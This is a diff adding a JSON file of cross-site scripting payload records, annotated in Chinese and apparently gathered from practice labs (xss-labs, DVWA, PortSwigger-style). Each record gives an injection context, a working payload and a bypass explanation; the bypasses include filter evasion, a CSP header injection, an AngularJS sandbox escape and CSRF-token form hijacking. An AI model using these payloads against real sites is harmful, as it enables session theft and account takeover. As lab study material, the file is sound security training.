@@ -1,0 +1,189 @@
+[
+  {
+    "id": "auto-20261013002810",
+    "context": "xss-labs level1：name 参数的值被原样输出到 HTML 正文（无标签/引号上下文），无任何过滤或编码",
+    "reference_payload": "<script>alert(1)</script>",
+    "principle": "参数直接反射进 HTML 正文，无过滤无编码，脚本标签直接解析执行",
+    "source": "xss-labs",
+    "verify_url": "http://localhost:8080/level1.php?name={payload}"
+  },
+  {
+    "id": "auto-20261012172026",
+    "context": "xss-labs level3：keyword 反射进 h2 与 input 的单引号 value 属性；< > & 与 \" 被转义（htmlspecialchars 风格），单引号未转义",
+    "reference_payload": "' autofocus onfocus=alert(1) x='",
+    "principle": "单引号属性 breakout + 行内事件 onfocus + autofocus 自动触发",
+    "source": "xss-labs",
+    "verify_url": "http://localhost:8080/level3.php?keyword={payload}"
+  },
+  {
+    "id": "auto-20261012172242",
+    "context": "xss-labs level5：keyword 反射进 input 双引号 value；过滤规则：全局把 `on`→`o_n`、把 `<script`→`<scr_ipt`（`<`/`>` 本身放行）",
+    "reference_payload": "\"><iframe src=\"data:text/html,%3Cscript%3Ealert(1)%3C/script%3E\">",
+    "principle": "属性 breakout + data: iframe 载体，用百分号编码避开 `<script`/`on` 关键字过滤",
+    "source": "xss-labs"
+  },
+  {
+    "id": "auto-20261012014703",
+    "context": "level7.php?keyword= 反射进 <input value=\"...\">；服务端 str_replace 删除关键词 script/on/src/href/data 等（非递归）",
+    "reference_payload": "\"><scrscriptipt>alert(1)</scrscriptipt>",
+    "principle": "关键词过滤嵌套绕过（scrscriptipt→script）",
+    "source": "xss-labs"
+  },
+  {
+    "id": "auto-20261012032305",
+    "context": "level9.php：GET 参数 keyword 反射进 `<input value=\"...\">`（htmlspecialchars ENT_COMPAT，双引号属性无法 breakout）与 `<a href=\"...\">`（strtolower + script/src/on/href/data 插下划线 + `\"`→无分号 &quot）。新增合法性校验：keyword 不含 http:// 时 href 显示「您的链接不合法？有没有！」。两 sink 均在双引号属性内，无免交互 breakout 路径，唯一通路为 href 的 javascript: 伪协议、需点击。",
+    "reference_payload": "keyword=java&#115;cript:alert(1)//http://z（URL 编码 java%26%23115%3Bcript%3Aalert(1)//http%3A%2F%2Fz），点击「友情链接」后弹窗",
+    "principle": "HTML 实体绕关键词过滤 + 满足 http:// 白名单校验（//http://z 被 JS 注释）；href javascript: 点击型；自动导航覆盖不到，需人工触发",
+    "source": "xss-labs"
+  },
+  {
+    "id": "auto-20261012040053",
+    "context": "level13.php：t_cook 回显 $_COOKIE['user']，未转义地落进 `<input name=\"t_cook\" value=\"...\" type=\"hidden\">`，且服务端对 cookie 值做 strtolower。服务端每次响应都 Set-Cookie 重置 user=call me maybe?（$_COOKIE 读请求、setcookie 写响应），因此必须在写入 cookie 后立即发请求，中间不能再发一次请求。",
+    "reference_payload": "cookie: user=`\"/type=\"image\"/src=\"x\"/onerror=\"alert(1)` → 渲染为 `<input value=\"\"/type=\"image\"/src=\"x\"/onerror=\"alert(1)\" type=\"hidden\">`，type=image + 坏 src 自动触发 onerror",
+    "principle": "Cookie 头注入（同源 JS document.cookie 写，经 javascript: 链接自动执行）；cookie 值不能含空格 → 用带引号的属性值 + `/` 作分隔（注意 `/` 只在「属性名之前」状态分隔，不能分隔未加引号的值）；Set-Cookie 重置需写后立即验证",
+    "source": "xss-labs"
+  },
+  {
+    "id": "auto-20261012042125",
+    "context": "level16.php：keyword 反射进文本节点 `<center>...` 内；`<`/`>` 和字母放行、无关键字过滤，但服务端把空格替换为 `&nbsp;`（非 HTML 空白，导致标签名/属性粘连，常规 `空格` 分隔失效）。",
+    "reference_payload": "keyword = `<img%0Asrc=x%0Aonerror=alert(1)>`（用换行 %0a 代替空格分隔属性）",
+    "principle": "空格被替换导致标签粘连 → 用换行(\\n)/制表符等其它 HTML 空白字符替代空格分隔属性",
+    "source": "xss-labs"
+  },
+  {
+    "id": "auto-20261012173322",
+    "context": "xss-labs level18：arg01/arg02 拼进 <embed src=xsf02.swf?a=b ...> 未加引号 src 属性值；`<`/`>` 被转义无法逃出标签（与 level17 同型，仅 SWF 文件名不同）",
+    "reference_payload": "b onmouseover=alert(1)",
+    "principle": "未加引号属性值注入 onmouseover 事件，鼠标悬停人工触发",
+    "source": "xss-labs"
+  },
+  {
+    "id": "auto-20261010233853",
+    "context": "文章页评论表单的 comment 字段（textarea，POST /post/comment）持久化存储，渲染回文章页时落在 HTML 文本节点且无任何编码/过滤。",
+    "reference_payload": "<script>alert(1)</script>",
+    "principle": "Stored XSS / 评论持久化 / HTML 文本节点无编码",
+    "source": "auto"
+  },
+  {
+    "id": "auto-20261010234217",
+    "context": "GET 参数 search（首页搜索框）。输入落在会被当作 HTML 解析的 sink 中且未编码：探针 \"><b>marker</b> 的 <b> 被解析成 DOM 元素、标签消失，引号以字面文本显示，说明是 HTML 文本上下文（非属性值）。",
+    "reference_payload": "<img src=x onerror=alert(1)>",
+    "principle": "DOM XSS / HTML 解析型 sink / script 标签不执行改用事件处理器 onerror",
+    "source": "auto"
+  },
+  {
+    "id": "auto-20261011000152",
+    "context": "目标首页无输入框；漏洞在客户端：hashchange 事件触发时把 location.hash 未编码传入 jQuery 选择器 sink（HTML 片段被当标记解析）。关键约束：初次加载带 hash 不触发，必须加载后再次改变 hash 才执行。投递需 exploit server iframe：<iframe src=\"https://TARGET/#\" onload=\"this.src+='<img src=x onerror=print()>'\"></iframe>。",
+    "reference_payload": "#<img src=x onerror=print()>",
+    "principle": "DOM XSS / hashchange 事件驱动 sink / location.hash 源 / jQuery 选择器 sink / iframe onload 改 hash 投递",
+    "source": "auto"
+  },
+  {
+    "id": "auto-20261011005829",
+    "context": "Stored XSS：博客评论表单的 website 字段被存入后，回显在 `<a id=\"author\" href=\"用户输入\">名字</a>` 的双引号 href 属性里；双引号被 HTML 编码，无法用 `\"` breakout 出属性/标签。",
+    "reference_payload": "javascript:alert(1)",
+    "principle": "URL 属性上下文用 javascript: 伪协议（无法 breakout 引号时）",
+    "source": "auto"
+  },
+  {
+    "id": "auto-20261011131240",
+    "context": "商品详情页 /product，location.search 的 storeId 参数被客户端 JS 通过 document.write 拼进 <select> 元素内部（DOM XSS，不经服务端）。",
+    "reference_payload": "</select><img src=1 onerror=alert(1)>",
+    "principle": "document.write sink + select 元素内 breakout",
+    "source": "auto"
+  },
+  {
+    "id": "auto-20261011133308",
+    "context": "搜索页 search 参数经 XHR 到 /search-results 返回 JSON（{\"results\":[],\"searchTerm\":\"...\"}），客户端将该 JSON 响应文本直接 eval；服务端只把 \" 转义为 \\\"，不转义输入中的反斜杠。",
+    "reference_payload": "\\\"-alert(1)}//",
+    "principle": "eval sink + 反斜杠转义引号绕过（\\\" breakout）",
+    "source": "auto"
+  },
+  {
+    "id": "auto-20261011134412",
+    "context": "搜索参数反射进 HTML 文本节点，WAF 黑名单拦截大多数标签与属性（<script> 报 \"Tag is not allowed\"，onload 报 \"Attribute is not allowed\"），但 <body> 与 onresize 被放行；无自触发事件可用，需通过 iframe 改变宽度来触发 body 的 resize。lab 判定要求调用 print() 且无需用户交互。",
+    "reference_payload": "<iframe src=\"https://LAB/?search=<body onresize=print()>\" onload=this.style.width='100px'></iframe>",
+    "principle": "WAF 标签/属性白名单绕过 + body onresize + iframe 强制 resize 触发",
+    "source": "auto"
+  },
+  {
+    "id": "auto-20261011154859",
+    "context": "反射点：博客首页 GET /?search= 直接反射进 HTML 文本节点。WAF 黑名单拦截常见标签，但 SVG 白名单不全：漏放 <svg>、<animatetransform> 等标签及 onbegin 事件。",
+    "reference_payload": "<svg><animatetransform onbegin=alert(1)>",
+    "principle": "SVG 标签/事件白名单绕过（animatetransform + onbegin 自动触发）",
+    "source": "auto"
+  },
+  {
+    "id": "auto-20261011161629",
+    "context": "反射点：搜索页响应中 <script> 块内的 JS 字符串：var searchTerms = 'INPUT'; document.write('<img src=\"/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'\">');。单引号与反斜杠被转义，无法用 ' 跳出字符串。",
+    "reference_payload": "</script><script>alert(1)</script>",
+    "principle": "JS 字符串内被转义引号 → 改用 </script> 闭合脚本块 breakout（标签级逃逸）",
+    "source": "auto"
+  },
+  {
+    "id": "auto-20261011184354",
+    "context": "Stored XSS：博客评论的 website 字段被存下并反射进作者链接的 onclick 属性（内联 JS 字符串内，形如 onclick=\"var tracker={track(){}};tracker.track('WEBSITE');\"）。尖括号和双引号被 HTML 编码，单引号和反斜杠被转义。",
+    "reference_payload": "http://example.com?&apos;-alert(1)-&apos;",
+    "principle": "HTML 实体 &apos; 绕过 JS 字符串转义（实体解码发生在服务端转义之后）",
+    "source": "auto"
+  },
+  {
+    "id": "auto-20261011190602",
+    "context": "反射点在 search 参数，落在 JS template literal 内（如 var message = `0 search results for 'SEARCH'`）。尖括号、单双引号、反斜杠、反引号全部被 Unicode 转义（\\u003c 等），无法 breakout 字符串。",
+    "reference_payload": "${alert(1)}",
+    "principle": "template literal 插值 ${} 未转义",
+    "source": "auto"
+  },
+  {
+    "id": "auto-20261011211240",
+    "context": "PortSwigger \"Reflected XSS with AngularJS sandbox escape and CSP\"（EXPERT）。反射点 /?search= 的值被服务端原样插入页面并被 AngularJS(ng-app) 编译求值；页面有严格 CSP（禁内联脚本/事件处理器，禁 unsafe-eval），因此 Angular 指令/表达式是唯一执行路径；search 长度上限 80 字符。目标：alert(document.cookie)。",
+    "reference_payload": "exploit server body: <script>location='https://LAB/?search=<input id=x ng-focus=$event.composedPath()|orderBy:\\'(y=alert)(document.cookie)\\'>#x';</script>（注入 payload：<input id=x ng-focus=$event.composedPath()|orderBy:'(y=alert)(document.cookie)'> 配合 URL 片段 #x 自动聚焦）",
+    "principle": "CSP 绕过 + AngularJS 沙箱逃逸：用 $event.composedPath() 取到事件路径（含 window）作为 orderBy 的输入数组，orderBy 字符串 key 表达式 '(y=alert)(document.cookie)' 在沙箱外被求值执行；URL 片段 #x 让 id=x 元素自动获得焦点触发 ng-focus",
+    "source": "portswigger"
+  },
+  {
+    "id": "auto-20261011222657",
+    "context": "反射点：post 页 \"Back to Blog\" 链接 href 的 javascript: URL。输入被拼进 fetch 的 body 值（JS 单引号字符串）：`body:'/post?postId=1&x=<input>'`。服务端过滤掉 ( ) \\ [ ] %（禁止直接调 alert()），但允许 ' { } = > , / * : + 等。需点击链接才执行（javascript: href sink）。",
+    "reference_payload": "'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'  （URL 编码：%27%7d%2cx%3dx%3d%3e%7bthrow%2f**%2fonerror%3dalert%2c1337%7d%2ctoString%3dx%2cwindow%2b%27%27%2c%7bx%3a%27）",
+    "principle": "javascript: URL 字符串 breakout；括号过滤绕过 → throw + window.onerror=alert 间接调用 alert(1337)",
+    "source": "auto"
+  },
+  {
+    "id": "auto-20261012001924",
+    "context": "GET /my-account?email= 未转义反射进 change-email 表单 <input type=\"email\" name=\"email\" value=\"...\"> 的双引号 value 属性内，其后紧跟 hidden csrf；CSP 极严格（default-src 'self'），禁内联脚本与外部子资源，无法直接执行 JS，但 HTML/属性注入可用。反射点位于表单内部，可注入 submit 按钮做 form hijacking。",
+    "reference_payload": "hacker@evil-user.net\"><button type=\"submit\">Click</button>",
+    "principle": "严格 CSP 下无 JS 的 form hijacking：注入 <button type=submit>Click</button> 复用页面自带 CSRF token 提交原表单（配合 exploit server 重定向投递）",
+    "source": "auto"
+  },
+  {
+    "id": "auto-20261012010612",
+    "context": "反射点：GET /?search= 反射进 HTML 文本节点（<script> 可注入但被 CSP 拦截）。目标 CSP 的 report-uri 把 URL 参数 token 原样拼进响应头（report-uri /csp-report?token=<token>），token 未做分隔符过滤。script-src 无 'unsafe-inline'，内联脚本/事件处理器全被拦。",
+    "reference_payload": "/?search=<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'",
+    "principle": "CSP header injection / 参数反射进响应头，注入 script-src-elem 'unsafe-inline' 覆盖 script-src 恢复内联",
+    "source": "auto"
+  },
+  {
+    "id": "auto-20261013005522",
+    "context": "reflected XSS，反射点在 HTML 正文；过滤：script 关键字被替换、空格字符被替换成 &nbsp;，但换行/制表符等其它空白字符未过滤",
+    "reference_payload": "<img%0Asrc=x%0Aonerror=alert(1)>",
+    "principle": "过滤只针对空格字符，用换行符 %0A 充当属性分隔符绕过（或 &#x09; 实体）",
+    "source": "xss-labs",
+    "verify_url": "http://localhost:8080/level16.php?keyword={payload}"
+  },
+  {
+    "id": "auto-20261013025607",
+    "context": "DVWA Reflected XSS (security=low)，name 参数原样反射进 HTML 正文（\"Hello <name>\"），无 htmlspecialchars/无过滤",
+    "reference_payload": "&lt;script&gt;alert(1)&lt;/script&gt;",
+    "principle": "HTML 正文上下文直接反射，无编码过滤，闭合后注入 script 标签即可执行",
+    "source": "dvwa",
+    "verify_url": "http://localhost:8081/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(1)%3C%2Fscript%3E"
+  },
+  {
+    "id": "auto-20261013025714",
+    "context": "DVWA Reflected XSS，security=low。name 参数值原样拼接进 HTML 正文（Hello xxx），无编码无过滤，输入 \" > 直接闭合无标签上下文。",
+    "reference_payload": "&lt;script&gt;alert(1)&lt;/script&gt;",
+    "principle": "HTML 正文上下文直接注入 script 标签，无过滤",
+    "source": "DVWA",
+    "verify_url": "http://localhost:8081/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(1)%3C%2Fscript%3E"
+  }
+]
